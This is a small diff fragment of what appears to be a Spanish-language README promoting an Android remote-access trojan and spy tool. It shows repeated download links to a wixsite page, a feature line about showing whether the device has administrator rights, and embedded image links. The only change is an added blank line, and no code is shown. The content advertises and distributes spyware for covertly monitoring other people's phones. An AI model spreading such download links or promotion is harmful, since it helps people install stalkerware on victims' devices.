@@ -19,6 +19,7 @@ DESCARGARDE DE:https://nibiruanuna.wixsite.com/android-rat-spy
 ⭐️Mostrar si el dispositivo es administrador 68747470733a2f2f692e696d6775722e636f6d2f4f69554f55326e2e6a7067 Disponible para rata: https://nibiruanuna.wixsite.com/android-rat-sp
 
 
+
 ![68747470733a2f2f692e696d6775722e636f6d2f4f69554f55326e2e6a7067](https://github.com/androidrat2023/AndroidSpy/assets/133962787/647c4d90-1bfb-4d0d-96b4-f488682e1b04)
 
 
